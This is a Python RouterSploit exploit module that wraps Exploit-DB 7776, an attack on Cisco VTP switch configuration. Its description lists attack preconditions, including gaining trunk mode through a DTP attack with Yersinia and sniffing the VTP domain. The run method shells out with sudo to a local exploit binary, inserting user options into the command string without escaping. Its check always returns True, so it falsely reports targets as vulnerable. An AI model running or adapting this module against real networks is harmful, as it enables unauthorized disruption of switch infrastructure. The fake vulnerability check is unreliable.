import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "EDB-ID:7776",

        "description": "1.the switch must in Server/Client Mode.  "
                       "2.the port ,attacker connected,must be in trunk Mode. Cisco Ethernet ports with no configuration are not "
                       "in trunk.but trunk mode can be obtained through DTP attack by Yersinia."
                       "3.you must known the vtp domain,this can be sniffed"
                       "4.some codes are from Yersinia.",

        "authors": (

            "showrun",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/7776",

        ),

        "devices": (

            "Cisco, EDB-ID:7776"
        ),
    }

    interface = OptString(""," interface name(must assign)")
    vtp_domain = OptString(""," vtp domain")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            s = "sudo ./exploit-db-7776 -i {0}"
            if self.vtp_domain:
                s += " -d {1}"
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = s.format(self.interface,self.vtp_domain)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
